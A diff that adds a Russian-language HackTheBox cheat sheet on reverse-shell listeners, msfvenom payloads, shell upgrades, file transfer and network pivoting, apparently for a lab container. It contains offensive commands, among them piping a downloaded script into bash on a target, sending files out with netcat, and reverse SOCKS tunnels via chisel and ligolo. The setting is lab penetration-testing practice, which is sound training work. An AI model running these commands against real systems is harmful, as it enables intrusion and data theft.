@@ -1,0 +1,55 @@
+# HTB: шеллы, передача файлов, пивотинг
+
+## Листенеры в контейнере
+
+Адрес для обратных соединений — `$LHOST` (tun-адрес контейнера). Слушать на всех интерфейсах, порт любой свободный.
+
+```bash
+nc -lvnp 4444
+rlwrap -cAr nc -lvnp 4444        # стрелки и история без полного TTY
+penelope -p 4444                 # авто-апгрейд TTY, сессии, аплоад одной командой
+```
+
+Генерация пейлоадов: `msfvenom -p linux/x64/shell_reverse_tcp LHOST=$LHOST LPORT=4444 -f elf`, для Windows `-f exe`. Однострочники reverse shell по языкам ищите в материалах запросом `reverse shell` (PayloadsAllTheThings: Methodology and Resources).
+
+## Апгрейд шелла до полного TTY (Linux-цель)
+
+```bash
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+# затем на атакующей стороне: Ctrl+Z, stty raw -echo; fg, Enter
+export TERM=xterm; stty rows 40 cols 160   # размеры — как в своём терминале (stty size)
+```
+
+Windows-цель: шелл удобнее через `evil-winrm` при открытых 5985 и кредах, чем голый reverse.
+
+## Передача файлов на цель и с цели
+
+```bash
+cd /opt/tools/linux && python3 -m http.server 8000        # в контейнере, в отдельной вкладке терминала или tmux
+curl http://$LHOST:8000/linpeas.sh | bash                  # на Linux-цели
+certutil -urlcache -split -f http://$LHOST:8000/winPEASx64.exe   # на Windows; кавычки и пути проверять по месту
+```
+
+- SMB-вариант (когда HTTP на цели закрыт egress-правилами редко, но бывает): `impacket-smbserver share /opt/tools -smb2support`, на цели `copy \\$LHOST\share\file`.
+- Обратно с цели: `nc $LHOST 5555 < file`, у нас `nc -lvnp 5555 > file`; большие файлы — `curl -T` не везде, надёжнее base64 кусками только в крайнем случае.
+- В свой терминал пользователя файл с цели принимать в `/work`, чтобы остался в задаче.
+
+## Пивотинг во внутренние сети (ProLabs, двойные машины)
+
+Порядок предпочтения: ligolo-ng (полный L3), потом chisel + proxychains (только TCP).
+
+```bash
+# атакующий (контейнер): сертификат и proxy
+ligolo-proxy -selfcert -laddr 0.0.0.0:11601
+# цель: агент из /opt/tools (ligolo-agent для нужной ОС)
+./ligolo-agent -connect $LHOST:11601 -ignore-cert
+# в сессии ligolo: session -> ifconfig -> start; маршрут в контейнер добавит сам (tun ligolo)
+sudo ip route add <внутренняя-подсеть>/24 dev ligolo   # если proxy не добавил
+```
+
+Chisel пара одной версии: сервер у нас `/usr/local/bin/chisel server -p 8001 --reverse`, на цели `/opt/tools/windows/chisel.exe client $LHOST:8001 R:socks`; дальше `proxychains4 -f` с `socks5 127.0.0.1 1080` и инструменты только TCP (`nmap -sT -Pn`, без SYN/UDP).
+
+## Стабильность сессий
+
+- Длинные листенеры, http-сервер и сканы держать в `tmux` внутри своего терминала, чтобы не потерять при закрытии вкладки: `tmux new -s htb`.
+- Если шелл умер, сначала проверить, жив ли листенер и тот же ли `$LHOST` (VPN переподключался — адрес мог смениться).
